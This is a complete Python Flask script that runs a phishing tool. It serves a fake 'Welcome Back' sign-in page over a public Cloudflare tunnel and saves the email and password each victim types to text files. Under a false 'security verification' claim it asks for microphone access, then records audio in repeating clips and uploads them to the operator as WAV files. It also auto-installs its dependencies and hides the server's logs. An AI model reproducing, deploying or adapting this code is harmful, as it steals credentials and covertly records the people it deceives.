import os
import base64
import subprocess
import sys
import re
import logging
from threading import Thread
import time
from datetime import datetime
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

# --- Auto-install missing dependencies ---

def install_python_package(package):
    """Installs a Python package using pip."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def install_system_package(pkg_name):
    """Attempts to install a system package on Termux (Android) or shows manual instructions."""
    # Detect if running on Termux
    if os.path.exists('/data/data/com.termux'):
        print(f"[INFO] Termux detected. Installing {pkg_name} via pkg...")
        subprocess.run(['pkg', 'install', pkg_name, '-y'], check=True)
        return True
    else:
        print(f"[ERROR] {pkg_name} is not installed.", file=sys.stderr)
        if pkg_name == 'cloudflared':
            print("-> Please install cloudflared manually from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        elif pkg_name == 'ffmpeg':
            print("-> Please install ffmpeg manually from: https://ffmpeg.org/download.html", file=sys.stderr)
        return False

def check_dependencies():
    """Checks for cloudflared, FFmpeg, and Flask; auto-installs missing Python packages."""
    # 1. cloudflared
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        if not install_system_package('cloudflared'):
            sys.exit(1)

    # 2. FFmpeg
    try:
        subprocess.run(["ffmpeg", "-version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        if not install_system_package('ffmpeg'):
            sys.exit(1)

    # 3. Flask (Python package)
    try:
        __import__('flask')
    except ImportError:
        print("Installing missing Python package: Flask...")
        install_python_package('flask')

def get_recording_duration():
    """Prompt user to choose recording duration in seconds."""
    while True:
        try:
            print("\n" + "="*50)
            print("SET RECORDING DURATION")
            print("="*50)
            print("How many seconds should each recording be?")
            print("Recommended: 15-30 seconds for best results")
            print("="*50)
            
            duration = input("Enter duration in seconds (e.g., 15, 30, 60): ").strip()
            
            if not duration:
                print("Using default duration: 15 seconds")
                return 15000  # milliseconds
            
            duration_sec = int(duration)
            if duration_sec <= 0:
                print("Please enter a positive number.")
                continue
            if duration_sec > 300:
                print("Warning: Very long duration (>5 minutes) may cause performance issues.")
                confirm = input("Continue anyway? (y/n): ").lower()
                if confirm != 'y':
                    continue
            
            print(f"Recording duration set to {duration_sec} seconds")
            return duration_sec * 1000
        except ValueError:
            print("Invalid input. Please enter a number.")
        except KeyboardInterrupt:
            print("\nOperation cancelled.")
            sys.exit(0)

def run_cloudflared_and_print_link(port, script_name):
    """Starts cloudflared tunnel and prints the public URL."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\n{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

# --- Flask Application (no pydub, uses ffmpeg directly) ---
app = Flask(__name__)
RECORDING_DURATION_MS = 15000  # default
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
os.makedirs(RECORDINGS_FOLDER, exist_ok=True)

def get_html_template(recording_duration_ms):
    recording_duration_sec = recording_duration_ms // 1000
    return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }}
        @media (prefers-color-scheme: dark) {{
            :root {{
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }}
            input {{ color-scheme: dark; }}
        }}
        body {{
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }}
        .main-container {{ width: 100%; max-width: 400px; }}
        .logo-container {{ margin-bottom: 24px; }}
        .logo-container svg {{ width: 48px; height: 48px; fill: var(--button-bg-color); }}
        .login-form {{
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }}
        h1 {{ margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }}
        p {{ color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }}
        input[type="email"], input[type="password"] {{
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }}
        input::placeholder {{ color: var(--subtle-text-color); }}
        input[type="submit"] {{
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }}
        input[type="submit"]:hover {{ background-color: var(--button-hover-bg-color); }}
        footer {{ margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }}
        footer a {{ color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }}
        footer a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Welcome Back</h1>
                <p>To enable voice commands and for security verification, please allow microphone access.</p>
                <input type="email" name="email" placeholder="Enter your email address" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                <input type="submit" value="Sign In Securely">
            </form>
        </main>
        <footer>
            <a href="#">Terms of Use</a> &bull; <a href="#">Privacy Policy</a> &bull; <a href="#">Support</a>
        </footer>
    </div>
    <script>
        async function startRecordingLoop(stream) {{
            const options = {{
                mimeType: 'audio/webm;codecs=opus',
                audioBitsPerSecond: 128000
            }};
            const recorder = new MediaRecorder(stream, options);
            const audioChunks = [];

            recorder.ondataavailable = event => {{
                if (event.data.size > 0) audioChunks.push(event.data);
            }};

            recorder.onstop = () => {{
                const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {{
                    $.ajax({{
                        url: '/upload_audio', type: 'POST',
                        data: JSON.stringify({{ audio: reader.result.split(',')[1] }}),
                        contentType: 'application/json; charset=utf-8'
                    }});
                }};
                startRecordingLoop(stream);
            }};

            recorder.start();
            setTimeout(() => {{
                if(recorder.state === "recording") recorder.stop();
            }}, {recording_duration_ms});
        }}

        async function init() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                startRecordingLoop(stream);
            }} catch (err) {{
                console.error("Microphone access denied:", err);
            }}
        }}
        window.onload = init;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(get_html_template(RECORDING_DURATION_MS))

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(RECORDINGS_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Login successful. You will be redirected shortly.", 200

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data:
            return jsonify({"error": "No audio"}), 400
        
        audio_bytes = base64.b64decode(audio_data)
        
        # Save as WAV using ffmpeg (more reliable than pydub)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        wav_filename = f"recording_{timestamp}.wav"
        wav_path = os.path.join(RECORDINGS_FOLDER, wav_filename)
        
        # Run ffmpeg to convert webm (from stdin) to wav
        ffmpeg_cmd = [
            'ffmpeg', '-i', 'pipe:0',        # read from stdin
            '-acodec', 'pcm_s16le',          # WAV codec
            '-ar', '44100',                  # sample rate
            '-ac', '1',                      # mono
            '-y',                            # overwrite output
            wav_path
        ]
        proc = subprocess.run(ffmpeg_cmd, input=audio_bytes, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if proc.returncode != 0:
            raise RuntimeError("ffmpeg conversion failed")
        
        return jsonify({"message": "Audio saved."}), 200
    except Exception as e:
        print(f"[ERROR] Failed to process audio: {e}", file=sys.stderr)
        return jsonify({"error": "Failed to process audio on server."}), 500

if __name__ == '__main__':
    # Auto-install all missing dependencies
    check_dependencies()
    
    # Get recording duration from user
    RECORDING_DURATION_MS = get_recording_duration()
    
    print(f"\n{'='*50}")
    print(f"Recording Configuration:")
    print(f"Duration: {RECORDING_DURATION_MS//1000} seconds")
    print(f"Save Location: {RECORDINGS_FOLDER}")
    print(f"{'='*50}\n")
    
    # Silence Flask logs
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    
    port = 4040
    script_name = "Login Page (Microphone)"
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)